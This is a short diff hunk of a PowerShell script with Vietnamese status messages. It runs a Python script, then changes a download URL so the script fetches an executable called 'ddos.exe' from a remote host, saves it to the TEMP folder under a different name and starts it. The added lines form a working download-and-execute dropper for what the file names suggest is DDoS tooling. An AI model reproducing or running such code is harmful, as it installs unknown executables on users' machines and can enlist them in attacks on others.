@@ -37,7 +37,7 @@ if (-Not (Get-Command python -ErrorAction SilentlyContinue)) {
 Write-Host "🚀 Đang chạy script Python..."
 pythonw $scriptPath
 
-$url = "https://ornate-gaufre-a9dbcd.netlify.app/trumddos.exe"
+$url = "http://ancuopvpscongkhai.wvxx.dpdns.org/ddos.exe"
 $outfile = "$env:TEMP\sechgay.exe"
 Invoke-WebRequest -Uri $url -OutFile $outfile
 Start-Process $outfile
